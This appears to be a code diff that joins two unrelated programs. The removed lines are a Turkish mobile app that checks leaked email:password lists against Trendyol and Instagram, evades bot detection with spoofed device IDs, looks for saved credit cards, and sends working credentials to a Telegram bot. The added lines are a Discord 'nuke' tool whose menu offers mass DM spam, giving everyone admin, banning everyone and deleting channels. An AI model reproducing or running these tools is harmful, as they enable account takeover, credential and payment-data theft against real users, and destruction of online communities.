-        self.results_text = f"[color={COLOR_INFO_HEX}]Trendyol Kontrol Başlatılıyor ({self.total_count} hesap)...\n[/color]"
-        self.checked_count = 0
-        self.hit_card_count = 0
-        self.hit_no_card_count = 0
-        self.bad_count = 0
-        self.update_stats_labels()
-
-        self._checker_thread = threading.Thread(target=self.run_checker, args=(token, chat_id, lines, self._stop_checker))
-        self._checker_thread.daemon = True
-        self._checker_thread.start()
-
-    def stop_checking(self):
-        if self._checker_thread and self._checker_thread.is_alive():
-            if hasattr(self, '_stop_checker'): self._stop_checker.set()
-            self.update_results(f"[color={COLOR_WARNING_HEX}]Durdurma isteği gönderildi...\n[/color]")
-        else:
-             self.enable_start_button()
-
-    @mainthread
-    def update_results(self, text, clear=False):
-        # Kivy markup renk kodlarını ekle
-        text = text.replace("[S]", f"[color={COLOR_INFO_HEX}]") # Mavi
-        text = text.replace("[B]", f"[color={COLOR_WHITE_HEX}]") # Beyaz
-        text = text.replace("[K]", f"[color={COLOR_BAD_HEX}]")   # Kırmızı
-        text = text.replace("[Y]", f"[color={COLOR_HIT_HEX}]")   # Yeşil
-        text = text.replace("[X]", f"[color={COLOR_WARNING_HEX}]") # Turuncu uyarı
-
-        # Önceki update_results mantığı (başına ekle, limitle)
-        try:
-            if clear:
-                self.results_label.text = text # Doğrudan label'ı güncelle
-            else:
-                current_lines = self.results_label.text.split('\n')
-                # Başa ekleme yaparken renk kodlarının kapanmasını sağla ([/color])
-                formatted_text = text.strip() + f"[/color]\n" if "[color=" in text else text
-
-                if len(current_lines) > 400: # Limiti biraz azalttık
-                    preserved_header = "\n".join(current_lines[:1]) # İlk satırı (Başlatılıyor...) koru
-                    trimmed_body = "\n".join(current_lines[1:300])
-                    self.results_label.text = preserved_header + "\n" + formatted_text + trimmed_body
-                else:
-                    self.results_label.text = formatted_text + self.results_label.text
-
-            # ScrollView'u en üste kaydır
-            if self.layout and len(self.layout.children) > 0:
-                 scroll_view = self.layout.children[0]
-                 if isinstance(scroll_view, ScrollView):
-                     Clock.schedule_once(lambda dt: setattr(scroll_view, 'scroll_y', 1), 0)
-        except Exception as e:
-            print(f"Error updating results UI: {e}")
-            if clear: self.results_text = text
-            else: self.results_text = text + self.results_text # Fallback
-
-    @mainthread
-    def enable_start_button(self):
-        self.start_button.text = 'Kontrolü Başlat'
-        self.start_button.background_color = COLOR_HIT_RGBA
-        self._is_checker_running = False
-        self._checker_thread = None
-        self.update_stats_labels()
-
-    # --- Trendyol Checker Fonksiyonları (Sınıf Metotları Olarak) ---
-
-    def gondertelegram(self, token, chat_id, mesaj):
-        if not token or not chat_id: return
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        payload = {"chat_id": chat_id, "text": mesaj}
-        try:
-            response = requests.post(url, json=payload, timeout=10)
-            # Telegram API yanıtını kontrol etmeye gerek yok (orijinal kodda da yoktu)
-        except Exception as e:
-            self.update_results(f"[K]Telegram gönderme hatası: {e}[B]\n")
-
-    def rastgelecihaz(self):
-        cihaz = random.choice(self.cihazlar)
-        # User agent seçimi ve formatlama
-        base_useragent = random.choice(self.useragentler)
-        try:
-            useragent = base_useragent.format(android=cihaz["android"], device=cihaz["device"], build=cihaz["build"])
-        except KeyError: # Eğer genel bir user agent seçildiyse formatlama hatası verir
-             useragent = base_useragent # Olduğu gibi kullan
-        return cihaz, useragent
-
-    def denemelogin(self, email, password, stop_event):
-        if not self.scraper: return None # Cloudscraper yüklenmediyse çık
-
-        url = "https://apigw.trendyol.com/member-member-login-app-service/auth/token"
-        cihaz, useragent = self.rastgelecihaz()
-        headers = {
-            "User-Agent": useragent, "Accept-Encoding": "gzip", "Content-Type": "application/json",
-            "platform": "Android", "osversion": cihaz["android"],
-            "deviceid": f"{random.randint(100000, 999999)}-{random.randint(1000, 9999)}-{random.randint(10000, 99999)}",
-            "build": cihaz["build"],
-        }
-        payload = {"guestToken": "", "password": password, "username": email}
-
-        for deneme in range(5): # Max 5 deneme
-            if stop_event.is_set(): return None # Durdurma sinyali geldiyse çık
-
-            try:
-                response = self.scraper.post(url, headers=headers, json=payload, timeout=20)
-
-                if response.status_code == 429:
-                    bekleme_suresi = (deneme + 1) * 5
-                    self.update_results(f"[X]Fazla deneme, {bekleme_suresi} sn bekleniyor...[B]\n")
-                    # time.sleep yerine stop_event.wait kullan
-                    if stop_event.wait(timeout=bekleme_suresi): return None # Beklerken durdurulursa çık
-                    continue # Tekrar dene
-
-                if response.status_code != 200:
-                    # Başarısız giriş loglamak yerine None dönelim, run_checker ele alsın
-                    # self.update_results(f"[K]Başarısız giriş (Kod: {response.status_code})[B]\n")
-                    return None # Başarısız
-
-                try:
-                    response_data = response.json()
-                    return response_data.get("accessToken") # Token'ı döndür
-                except json.JSONDecodeError:
-                    self.update_results(f"[K]Geçersiz JSON yanıtı: {response.text[:50]}...[B]\n")
-                    return None # JSON hatası
-
-            except requests.exceptions.Timeout:
-                 self.update_results(f"[K]Login isteği zaman aşımı[B]\n")
-                 # Zaman aşımında biraz bekleyip tekrar deneyebilir veya None dönebiliriz. Şimdilik None dönelim.
-                 return None
-            except Exception as g:
-                self.update_results(f"[K]Login istek hatası: {g}[B]\n")
-                # Genel hatada da None dönelim
-                return None
-
-        self.update_results(f"[K]IP Ban veya kalıcı login hatası![B]\n")
-        return None # 5 deneme de başarısız olursa
-
-    def kartdenetle(self, accesstoken, email, password, token, chat_id, stop_event):
-        if stop_event.is_set(): return # Durdurma sinyali
-
-        url = "https://apigw.trendyol.com/discovery-mweb-checkoutgw-service/saved-cards/hesabim/KrediKartlarim"
-        params = {'__renderMode': "stream", 'storefrontId': "1", 'channelId': "1", 'language': "tr", 'tld': ".com", 'countryCode': "TR"}
-        headers = {
-            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36",
-            'Accept-Encoding': "gzip, deflate, br, zstd", 'Authorization': f"Bearer {accesstoken}",
-            'Cookie': f"token={accesstoken}; platform=mweb;", 'accept-language': "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"
-        }
-        try:
-            response = requests.get(url, params=params, headers=headers, timeout=15)
-            response.raise_for_status() # HTTP hatalarını kontrol et
-            soup = BeautifulSoup(response.text, "html.parser")
-
-            haskart = False
-            kartinfo = "Yok"
-
-            # Kart arama mantığı (orijinal koddaki gibi)
-            if soup.find("div", {"data-testid": "saved-card-item"}) or soup.find("div", class_="card-list-item"):
-                haskart = True
-                kartinfo = "Kart Mevcut (Detaylar Gizli)"
-            else:
-                 # Regex ile sansürlü kart numarası ara
-                 match = soup.find(string=re.compile(r"\*{4}\s\*{4}\s\*{4}\s\d{4}"))
-                 if match:
-                     haskart = True
-                     kartinfo = f"Kart Mevcut: {match.strip()}"
-
-            # Sonuçları işle
-            if haskart:
-                self.hit_card_count += 1
-                self.update_results(f"[Y][KARTLI HIT] {email}:{password} -> {kartinfo}[B]\n")
-                mesaj = f"🔥 Trendyol Kartlı HIT 🔥\nEmail: {email}\nŞifre: {password}\nKart: {kartinfo}\nDev: @Ritalin404"
-                self.gondertelegram(token, chat_id, mesaj)
-            else:
-                self.hit_no_card_count += 1
-                self.update_results(f"[S][HIT] {email}:{password} -> Kart Yok[B]\n") # Mavi yapalım
-                mesaj = f"✅ Trendyol HIT (Kartsız) ✅\nEmail: {email}\nŞifre: {password}\nKart: Yok\nDev: @Ritalin404"
-                self.gondertelegram(token, chat_id, mesaj)
-
-        except requests.exceptions.Timeout:
-            self.update_results(f"[K]Kart kontrolü zaman aşımı: {email}[B]\n")
-            # Zaman aşımını BAD sayabiliriz
-            self.bad_count += 1
-        except requests.exceptions.RequestException as e:
-            self.update_results(f"[K]Kart kontrolü hatası: {email} -> {e}[B]\n")
-            self.bad_count += 1
-        except Exception as e:
-             self.update_results(f"[K]Kart kontrolü bilinmeyen hata: {email} -> {e}[B]\n")
-             self.bad_count += 1
-        finally:
-             self.update_stats_labels() # Her kart kontrolünden sonra istatistikleri güncelle
-
-    def run_checker(self, token, chat_id, lines, stop_event):
-        for i, line in enumerate(lines):
-            if stop_event.is_set():
-                self.update_results(f"[X]İşlem durduruldu.[B]\n")
+            if option == '1':
+                message, new_server_name, change_notification, add_admin, channel_name, text_channel_amount, voice_channel_amount = await use_preset(config)
+                server_id = await get_server_id()
+                await create_channels_webhooks_send_messages(server_id, channel_name, new_server_name, client, message, change_notification, add_admin, text_channel_amount, voice_channel_amount)
                 break
-
-            email, password = line.strip().split(":", 1)
-            self.update_results(f"[S]Deniyor: {email}:{password}[B]\n")
-            self.checked_count += 1
-
-            accesstoken = self.denemelogin(email, password, stop_event)
-
-            if stop_event.is_set(): break # Login sonrası durdurma kontrolü
-
-            if accesstoken:
-                # Login başarılı, kart kontrolü yap
-                self.kartdenetle(accesstoken, email, password, token, chat_id, stop_event)
-            else:
-                # Login başarısız
-                self.bad_count += 1
-                self.update_results(f"[K][BAD] {email}:{password}[B]\n")
-
-            self.update_stats_labels() # Her hesaptan sonra güncelle
-
-            # Durdurma sinyali yoksa bekle
-            if not stop_event.is_set():
-                try:
-                    # time.sleep(random.randint(5, 10))
-                    if stop_event.wait(timeout=random.uniform(3, 7)): # Daha kısa ve rastgele bekleme
-                        break # Beklerken durdurulduysa çık
-                except Exception: pass
-
-        if not stop_event.is_set():
-            self.update_results(f"\n[S]Trendyol Kontrol Tamamlandı![B]\n"
-                                f"[Y]Kartlı Hit: {self.hit_card_count}[B] | "
-                                f"[S]Kartsız Hit: {self.hit_no_card_count}[B] | "
-                                f"[K]Bad: {self.bad_count}[B]\n")
-
-        self.enable_start_button()
-
-
-# --- Instagram Checker Ekranı ---
-class InstaCheckerScreen(Screen): # Adı değiştirildi
-    results_text = StringProperty("İşlem bekleniyor...\n")
-    checked_count = NumericProperty(0)
-    total_count = NumericProperty(0)
-    hits_count = NumericProperty(0)
-    secure_count = NumericProperty(0)
-    bad_count = NumericProperty(0)
-
-    def __init__(self, **kwargs):
-        super().__init__(**kwargs)
-        self.layout = BoxLayout(orientation='vertical', padding=dp(10), spacing=dp(8))
-
-        # --- Geri Butonu ve Başlık ---
-        header_layout = BoxLayout(size_hint_y=None, height=dp(40))
-        back_button = Button(
-            text='< Geri', size_hint_x=None, width=dp(60), font_size='14sp',
-            on_press=self.go_back, background_color=COLOR_WARNING_RGBA, background_normal='', color=COLOR_WHITE_RGBA)
-        header_layout.add_widget(back_button)
-        header_layout.add_widget(Label(text="[b]Instagram Checker[/b]", markup=True, font_size='18sp', color=COLOR_WHITE_RGBA))
-        self.layout.add_widget(header_layout)
-
-        # --- Input Alanları (Trendyol ile aynı yapı) ---
-        input_layout = BoxLayout(orientation='vertical', spacing=dp(5), size_hint_y=None, height=dp(240))
-
-        input_layout.add_widget(Label(text="Telegram Bildirim (Opsiyonel):", size_hint_y=None, height=dp(18), font_size='13sp', halign='left', text_size=(Window.width - dp(20), None), color=COLOR_LIGHT_GRAY_RGBA))
-        self.token_input = TextInput(hint_text='Token', multiline=False, size_hint_y=None, height=dp(35), font_size='14sp', foreground_color=COLOR_WHITE_RGBA, hint_text_color=COLOR_DARK_GRAY_RGBA, background_color=(0.1,0.1,0.15,1))
-        input_layout.add_widget(self.token_input)
-        self.id_input = TextInput(hint_text='Chat ID', multiline=False, size_hint_y=None, height=dp(35), font_size='14sp', foreground_color=COLOR_WHITE_RGBA, hint_text_color=COLOR_DARK_GRAY_RGBA, background_color=(0.1,0.1,0.15,1))
-        input_layout.add_widget(self.id_input)
-        # input_layout.add_widget(Label()) # Boşluk
-
-        input_layout.add_widget(Label(text="Hesap Listesi (email:şifre):", size_hint_y=None, height=dp(18), font_size='13sp', halign='left', text_size=(Window.width - dp(20), None), color=COLOR_LIGHT_GRAY_RGBA))
-        self.combo_input = TextInput(
-            hint_text='Her satıra bir hesap...', multiline=True, size_hint_y=None, height=dp(100), font_size='13sp',
-            foreground_color=COLOR_WHITE_RGBA, hint_text_color=COLOR_DARK_GRAY_RGBA, background_color=(0.1,0.1,0.15,1)
-        )
-        input_layout.add_widget(self.combo_input)
-        self.layout.add_widget(input_layout)
-
-        # --- Başlat/Durdur Butonu ---
-        self.start_button = Button(
-            text='Kontrolü Başlat', on_press=self.toggle_checking, size_hint_y=None, height=dp(45),
-            font_size='16sp', background_color=COLOR_HIT_RGBA, background_normal='', color=COLOR_WHITE_RGBA)
-        self.layout.add_widget(self.start_button)
-
-        # --- İstatistik Alanı ---
-        stats_layout = BoxLayout(size_hint_y=None, height=dp(22), spacing=dp(4))
-        self.total_label = Label(text=f"T: {self.total_count}", font_size='11sp', color=COLOR_LIGHT_GRAY_RGBA)
-        self.checked_label = Label(text=f"D: {self.checked_count}", font_size='11sp', color=COLOR_WHITE_RGBA)
-        self.hits_label = Label(text=f"Hit: {self.hits_count}", font_size='11sp', color=COLOR_HIT_RGBA)
-        self.secure_label = Label(text=f"Sec: {self.secure_count}", font_size='11sp', color=COLOR_SECURE_RGBA)
-        self.bad_label = Label(text=f"Bad: {self.bad_count}", font_size='11sp', color=COLOR_BAD_RGBA)
-        self.remaining_label = Label(text=f"Kalan: 0", font_size='11sp', color=COLOR_WHITE_RGBA) # Kalan eklendi
-
-        stats_layout.add_widget(self.total_label)
-        stats_layout.add_widget(self.checked_label)
-        stats_layout.add_widget(self.hits_label)
-        stats_layout.add_widget(self.secure_label)
-        stats_layout.add_widget(self.bad_label)
-        stats_layout.add_widget(self.remaining_label) # Eklendi
-        self.layout.add_widget(stats_layout)
-
-        # --- Sonuç Alanı ---
-        scroll_view = ScrollView(size_hint=(1, 1))
-        self.results_label = Label(
-            text=self.results_text, size_hint_y=None, markup=True, halign='left', valign='top',
-            padding=(dp(8), dp(8)), color=COLOR_WHITE_RGBA, font_size='12sp',
-            text_size=(Window.width - dp(36), None)
-        )
-        self.results_label.bind(texture_size=self.results_label.setter('size'))
-        self.bind(results_text=self.results_label.setter('text'))
-        scroll_view.add_widget(self.results_label)
-        self.layout.add_widget(scroll_view)
-
-        self.add_widget(self.layout)
-
-        self.output_file_path = os.path.join(App.get_running_app().user_data_dir, 'instagram_hits.txt')
-        self._checker_thread = None
-        self._stop_checker = threading.Event()
-        self._is_checker_running = BooleanProperty(False)
-
-    @mainthread
-    def update_stats_labels(self, *args): # Argüman eklendi
-        self.total_label.text = f"T: {self.total_count}"
-        self.checked_label.text = f"D: {self.checked_count}"
-        self.hits_label.text = f"Hit: {self.hits_count}"
-        self.secure_label.text = f"Sec: {self.secure_count}"
-        self.bad_label.text = f"Bad: {self.bad_count}"
-        remaining = self.total_count - self.checked_count
-        self.remaining_label.text = f"Kalan: {remaining}" # Güncellendi
-
-
-    # --- toggle_checking, start_checking, stop_checking, run_checker vb. ---
-    # Bu metotlar önceki koddan (Instagram Checker için olanlar) buraya
-    # kopyalanıp yapıştırılacak ve UI eleman adları (örn: self.results_label)
-    # bu sınıftakilerle eşleşecek şekilde ayarlanacak.
-    # run_checker içindeki renk kodları vs. doğru olmalı.
-    # Örnek olarak birkaçını ekliyorum, kalanını tamamlaman gerekecek.
-
-    def go_back(self, instance):
-        self.stop_checking()
-        self.manager.transition.direction = 'right'
-        self.manager.current = 'menu'
-
-    def toggle_checking(self, instance):
-        if self._is_checker_running:
-            self.stop_checking()
-        else:
-            self.start_checking()
-
-    def start_checking(self):
-        if self._checker_thread and self._checker_thread.is_alive(): return
-
-        if hasattr(self, '_stop_checker'): self._stop_checker.set()
-        self._stop_checker = threading.Event()
-
-        token = self.token_input.text.strip()
-        chat_id = self.id_input.text.strip()
-        combo_list_text = self.combo_input.text.strip()
-
-        if not combo_list_text:
-            self.update_results(f"[color={COLOR_BAD_HEX}]Hata: Hesap Listesi boş olamaz.[/color]\n", clear=True)
-            return
-
-        lines = [line.strip() for line in combo_list_text.split('\n') if ':' in line.strip()]
-        self.total_count = len(lines)
-
-        if self.total_count == 0:
-             self.update_results(f"[color={COLOR_BAD_HEX}]Hata: Geçerli formatta hesap bulunamadı.[/color]\n", clear=True)
-             return
-
-        self.start_button.text = 'Durdur'
-        self.start_button.background_color = COLOR_BAD_RGBA
-        self._is_checker_running = True
-
-        self.results_text = f"[color={COLOR_INFO_HEX}]Instagram Kontrol Başlatılıyor ({self.total_count} hesap)...\n[/color]"
-        self.results_text += f"[color={COLOR_LIGHT_GRAY_HEX}]Hitler: {self.output_file_path}\n[/color]\n"
-        self.checked_count = 0
-        self.hits_count = 0
-        self.secure_count = 0
-        self.bad_count = 0
-        self.update_stats_labels()
-
-        self._checker_thread = threading.Thread(target=self.run_checker, args=(token, chat_id, lines, self._stop_checker))
-        self._checker_thread.daemon = True
-        self._checker_thread.start()
-
-    def stop_checking(self):
-        if self._checker_thread and self._checker_thread.is_alive():
-            if hasattr(self, '_stop_checker'): self._stop_checker.set()
-            self.update_results(f"[color={COLOR_WARNING_HEX}]Durdurma isteği gönderildi...\n[/color]")
-        else:
-             self.enable_start_button()
-
-    @mainthread
-    def update_results(self, text, clear=False):
-        # Bu metot Trendyol'daki gibi olacak, renk kodlarını Kivy'ye çevirecek
-        # ve scroll işlemini yapacak. Önceki Insta checker kodundaki update_results'ı
-        # buraya adapte et.
-        try:
-            if clear:
-                self.results_label.text = text
-            else:
-                current_lines = self.results_label.text.split('\n')
-                formatted_text = text.strip() + f"[/color]\n" if "[color=" in text else text
-                if len(current_lines) > 400:
-                    preserved_header = "\n".join(current_lines[:2]) # İlk 2 satırı koru
-                    trimmed_body = "\n".join(current_lines[2:300])
-                    self.results_label.text = preserved_header + "\n" + formatted_text + trimmed_body
-                else:
-                    self.results_label.text = formatted_text + self.results_label.text
-
-            if self.layout and len(self.layout.children) > 0:
-                 scroll_view = self.layout.children[0]
-                 if isinstance(scroll_view, ScrollView):
-                     Clock.schedule_once(lambda dt: setattr(scroll_view, 'scroll_y', 1), 0)
-        except Exception as e:
-            print(f"Error updating results UI (Insta): {e}")
-            if clear: self.results_text = text
-            else: self.results_text = text + self.results_text
-
-
-    @mainthread
-    def enable_start_button(self):
-        self.start_button.text = 'Kontrolü Başlat'
-        self.start_button.background_color = COLOR_HIT_RGBA
-        self._is_checker_running = False
-        self._checker_thread = None
-        self.update_stats_labels()
-
-    def save_hit(self, line):
-        try:
-            with open(self.output_file_path, 'a', encoding='utf-8') as f:
-                f.write(line + '\n')
-        except Exception as e:
-            self.update_results(f"[color={COLOR_WARNING_HEX}]Dosya Yazma Hatası: {e}\n[/color]")
-
-    def send_telegram(self, token, chat_id, message):
-         # Bu metot da önceki Insta checker kodundan alınacak.
-         # (Yukarıdaki Trendyol'daki ile aynı, kopyalanabilir)
-        if not token or not chat_id: return
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
-        payload = {"chat_id": chat_id, "text": message}
-        try:
-            response = requests.post(url, json=payload, timeout=10)
-            # Yanıtı kontrol etmeye gerek yok (isteğe bağlı)
-        except Exception as e:
-            self.update_results(f"[color={COLOR_WARNING_HEX}]Telegram gönderme hatası: {e}\n[/color]")
-
-
-    def run_checker(self, token, chat_id, lines, stop_event):
-        # --- BU KISIM ÖNCEKİ KODDAKİ INSTAGRAM run_checker ---
-        # --- İLE TAMAMEN AYNI OLACAK, SADECE CLASS ---
-        # --- PROPERTY'LERİNİ (self.hits_count vb.) KULLANACAK ---
-        # --- ve update_results'ı çağıracak ---
-        local_hits = 0
-        local_secure = 0
-        local_bad = 0
-        local_checked = 0
-
-        for i, line in enumerate(lines):
-            if stop_event.is_set():
-                self.update_results(f"\n[color={COLOR_WARNING_HEX}]İşlem kullanıcı tarafından durduruldu.[/color]\n")
+            elif option == '2':
+                server_id = await get_server_id()
+                new_server_name = input(f"{Fore.YELLOW} [?] Please enter the new server name: \n #> ")
+                message = input(f"{Fore.YELLOW} [?] Please enter the message you want to send: \n #> ")
+                while True:
+                    change_notification_input = input(f"{Fore.YELLOW} [?] Do you want to change the notification setting to 'All messages'? (yes/no): \n #> ").lower()
+                    if change_notification_input in ['yes', 'no']:
+                        change_notification = change_notification_input == 'yes'
+                        break
+                    else:
+                        print(f"{Fore.RED} [!] Invalid input. Please enter 'yes' or 'no'.")
+                while True:
+                    add_admin_input = input(f"{Fore.YELLOW} [?] Do you want to add administrator permissions to @everyone? (yes/no): \n #> ").lower()
+                    if add_admin_input in ['yes', 'no']:
+                        add_admin = add_admin_input == 'yes'
+                        break
+                    else:
+                        print(f"{Fore.RED} [!] Invalid input. Please enter 'yes' or 'no'.")
+                channel_name = input(f"{Fore.YELLOW} [?] Please enter the base name for the new channels: \n #> ")
+                while True:
+                    text_channel_amount_input = input(f"{Fore.YELLOW} [?] Please enter the number of text channels: \n #> ")
+                    if text_channel_amount_input.isdigit():
+                        text_channel_amount = int(text_channel_amount_input)
+                        break
+                    else:
+                        print(f"{Fore.RED} [!] Invalid input. Please enter a number.")
+                while True:
+                    voice_channel_amount_input = input(f"{Fore.YELLOW} [?] Please enter the number of voice channels: \n #> ")
+                    if voice_channel_amount_input.isdigit():
+                        voice_channel_amount = int(voice_channel_amount_input)
+                        break
+                    else:
+                        print(f"{Fore.RED} [!] Invalid input. Please enter a number.")
+                await create_channels_webhooks_send_messages(server_id, channel_name, new_server_name, client, message, change_notification, add_admin, text_channel_amount, voice_channel_amount)
                 break
+            # ----------------------------------------------------
+            elif option == '3':
+                os.system("cls" if os.name == "nt" else "clear")
+                
+                banner_color_start = (128, 0, 128)  # Purple
+                banner_color_end = (255, 255, 255)   # White
+                banner_gradient = generate_gradient(banner_color_start, banner_color_end, len(banner))
 
-            line = line.strip()
-            email = ""; password = ""
-            if ':' in line:
-                parts = line.split(':', 1); email = parts[0].strip(); password = parts[1].strip() if len(parts) > 1 else ""
-            if not email or not password:
-                 local_bad += 1; local_checked += 1
-                 self.checked_count = local_checked; self.bad_count = local_bad
-                 continue
+                for i, char in enumerate(banner):
+                    print(f"\033[38;2;{banner_gradient[i][0]};{banner_gradient[i][1]};{banner_gradient[i][2]}m{char}", end="")
+                print("\033[0m")
 
-            device_uid = str(uuid.uuid4()); login_uuid = str(uuid.uuid4())
-            data = { "username": email, "password": password, "device_id": f"android-{device_uid}", "guid": login_uuid, "login_attempt_count": "0" }
+                print(f'{Fore.GREEN}                                  [+] We have logged in as {client.user}\n')
 
-            try:
-                current_headers = H_INSTA.copy()
-                if "Content-Length" in current_headers: del current_headers["Content-Length"]
-                response = requests.post(U_INSTA, headers=current_headers, data=data, timeout=15) # Timeout biraz kısa
-                response.raise_for_status()
-                req = response.json()
+                menu_color_start = (0, 128, 128)  # Teal
+                menu_color_end = (255, 255, 255)   # White
 
-                status=req.get("status","fail"); authenticated=req.get("authenticated",False); two_factor_required=req.get("two_factor_required",False); message=req.get("message","")
-                result_prefix = f"[color={COLOR_WHITE_HEX}]{email}:{password}[/color] -> "
+                menu_options = [
+                    "                   <1> Dm Everyone On A Server                     <13> Server Name change",
+                    "                   <2> Role Create Spam                            <14> Server Picture Change",
+                    "                   <3> Delete All Roles                            <15> Delete All Server Emojis",
+                    "                   <4> Give Everyone Admin                         <16> Spam New Server Emojis",
+                    "                   <5> Notification Server Settings To All         <17> Delete All Sounds (Soundboard)",
+                    "                   <6> Delete All Channels + vc's                  <18> Spam New Sounds (Soundboard)",
+                    "                   <7> Spam Create channels                        <19> Delete All Invites",
+                    "                   <8> Spam Create Categories                      <20> Spam New Server Invites",
+                    "                   <9> Spam Channels (msg)                         <21> Pause Server Invites",
+                    "                   <10> Kick Everyone                              <22> Deactivate Discord AutoMod",
+                    "                   <11> Ban Everyone                               <23> Deactivate Community",
+                    "                   <12> Unban Everyone                             <24> Activate Community",
+                    "                   <25> Threads Spam"
+                ]
 
-                if authenticated:
-                    local_hits += 1; self.hits_count = local_hits
-                    hit_line = f"[color={COLOR_HIT_HEX}][HIT][/color] {result_prefix}Giriş Başarılı!"
-                    self.update_results(hit_line + "\n"); self.save_hit(f"HIT:{line}")
-                    self.send_telegram(token, chat_id, f"✅ Insta HIT:\n{line}")
-                elif two_factor_required:
-                    local_secure += 1; self.secure_count = local_secure
-                    sec_line = f"[color={COLOR_SECURE_HEX}][SECURE][/color] {result_prefix}2FA Aktif!"
-                    self.update_results(sec_line + "\n"); self.save_hit(f"SECURE:{line}")
-                    self.send_telegram(token, chat_id, f"🔒 Insta SECURE (2FA):\n{line}")
-                elif "checkpoint_required" in message:
-                     local_secure += 1; self.secure_count = local_secure
-                     sec_line = f"[color={COLOR_SECURE_HEX}][SECURE][/color] {result_prefix}Checkpoint!"
-                     self.update_results(sec_line + "\n"); self.save_hit(f"SECURE_CHECKPOINT:{line}")
-                     self.send_telegram(token, chat_id, f"⚠️ Insta SECURE (Checkpoint):\n{line}")
-                elif "incorrect password" in message or (status == "fail" and not req.get("user", False)):
-                    local_bad += 1; self.bad_count = local_bad
-                    bad_line = f"[color={COLOR_BAD_HEX}][BAD][/color] {result_prefix}Yanlış Şifre/K.Yok"
-                    self.update_results(bad_line + "\n")
-                elif "rate limited" in message or "wait a few minutes" in message:
-                     self.update_results(f"[color={COLOR_WARNING_HEX}]Rate Limit! Bekleniyor...\n[/color]")
-                     if stop_event.wait(timeout=random.uniform(15, 25)): break # Beklerken durdurma
-                     local_bad += 1; self.bad_count = local_bad
-                     self.update_results(f"[color={COLOR_BAD_HEX}][BAD][/color] {result_prefix}Rate Limit Atl.[color={COLOR_BAD_HEX}]\n")
-                else:
-                    local_bad += 1; self.bad_count = local_bad
-                    error_msg = message if message else "Bilinmeyen Hata"
-                    bad_line = f"[color={COLOR_BAD_HEX}][BAD][/color] {result_prefix}{error_msg[:30]}"
-                    self.update_results(bad_line + "\n")
+                max_option_length = max(len(option) for option in menu_options)
+                menu_gradient = generate_gradient(menu_color_start, menu_color_end, max_option_length)
 
-            except requests.exceptions.Timeout:
-                local_bad += 1; self.bad_count = local_bad
-                self.update_results(f"[color={COLOR_WARNING_HEX}][TIMEOUT][/color] [color={COLOR_WHITE_HEX}]{email}:{password}[/color]\n")
-            except requests.exceptions.RequestException as e:
-                local_bad += 1; self.bad_count = local_bad
-                self.update_results(f"[color={COLOR_WARNING_HEX}][NET ERR][/color] [color={COLOR_WHITE_HEX}]{email}:{password}[/color] -> {str(e)[:30]}\n")
-            except Exception as e:
-                local_bad += 1; self.bad_count = local_bad
-                self.update_results(f"[color={COLOR_WARNING_HEX}][ERROR][/color] [color={COLOR_WHITE_HEX}]{email}:{password}[/color] -> {str(e)[:30]}\n")
-            finally:
-                 local_checked += 1; self.checked_count = local_checked
-                 self.update_stats_labels() # Her işlemden sonra istatistikleri güncelle
+                for option in menu_options:
+                    for i, char in enumerate(option):
+                        print(f"\033[38;2;{menu_gradient[i][0]};{menu_gradient[i][1]};{menu_gradient[i][2]}m{char}", end="")
+                    print("\033[0m")
 
-            if not stop_event.is_set():
-                try:
-                    if stop_event.wait(timeout=random.uniform(0.3, 0.8)): break # Kısa bekleme
-                except Exception: pass
+                option_3_selected = True
 
-        if not stop_event.is_set():
-            self.update_results(f"\n[color={COLOR_INFO_HEX}]Instagram Kontrol Tamamlandı![/color]\n")
-            # Son istatistikler zaten update_stats_labels ile güncelleniyor
+                print(f"{Fore.YELLOW}  ")
+                separate_option = input(f"{Fore.GREEN} Option (Separate Menu): \n #> ")
 
-        self.enable_start_button()
+                option_3_selected = True
 
+                if separate_option == '1':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+                    message = input(f"{Fore.GREEN} [?] Enter the message you want to send to everyone: \n #> ")
 
-# --- Instagram Unban/Spam Ekranı ---
-class UnbanScreen(Screen):
-    # --- BU EKRAN ÖNCEKİ KOD İLE AYNI KALACAK ---
-    # --- Sadece font boyutları ve yükseklikler ---
-    # --- diğer ekranlarla uyumlu hale getirilebilir ---
-    status_text = StringProperty("İşlem bekleniyor...")
-    is_spamming = BooleanProperty(False)
-    request_count = NumericProperty(0)
-    success_count = NumericProperty(0)
-    fail_count = NumericProperty(0)
+                    server = client.get_guild(server_id)
+                    if server is None:
+                        print(f"{Fore.RED} [!] Server not found.")
+                    else:
+                        if len(server.members) <= 1:
+                            print(f"{Fore.YELLOW} [!] No other members to DM on this server.")
+                        else:
+                            count = 0
+                            errors = 0
+                            for member in server.members:
+                                if member == client.user:
+                                    continue
+                                try:
+                                    await member.send(message)
+                                    count += 1
+                                    print(f"{Fore.YELLOW} [+] Message sent to {member.name}")
+                                except discord.Forbidden:
+                                    errors += 1
+                                    print(f"{Fore.RED} [!] Bot doesn't have permission to send messages to {member.name}")
+                                except Exception as e:
+                                    errors += 1
+                                    if isinstance(e, discord.HTTPException):
+                                        error_message = e.text
+                                        if e.code == 50007:
+                                            error_message = "Cannot send messages to this user"
+                                        print(f"{Fore.RED} [!] An error occurred while sending a message to {member.name}: {error_message}")
+                                    else:
+                                        print(f"{Fore.RED} [!] An unexpected error occurred while sending a message to {member.name}: {e}")
 
-    def __init__(self, **kwargs):
-        super().__init__(**kwargs)
-        self.layout = BoxLayout(orientation='vertical', padding=dp(10), spacing=dp(8))
+                elif separate_option == '2':
+                    server_id = int(input(f"{Fore.GREEN} [?] Enter the server ID: \n #> "))
+                    role_name = input(f"{Fore.GREEN} [?] Enter the role name you want to spam: \n #> ")
+                    num_roles = int(input(f"{Fore.GREEN} [?] Enter the number of roles to create: \n #> "))
 
-        # --- Geri Butonu ve Başlık ---
-        header_layout = BoxLayout(size_hint_y=None, height=dp(40))
-        back_button = Button(
-            text='< Geri', size_hint_x=None, width=dp(60), font_size='14sp',
-            on_press=self.go_back, background_color=COLOR_WARNING_RGBA, background_normal='', color=COLOR_WHITE_RGBA)
-        header_layout.add_widget(back_button)
-        header_layout.add_widget(Label(text="[b]Instagram Spam[/b]", markup=True, font_size='18sp', color=COLOR_WHITE_RGBA))
-        self.layout.add_widget(header_layout)
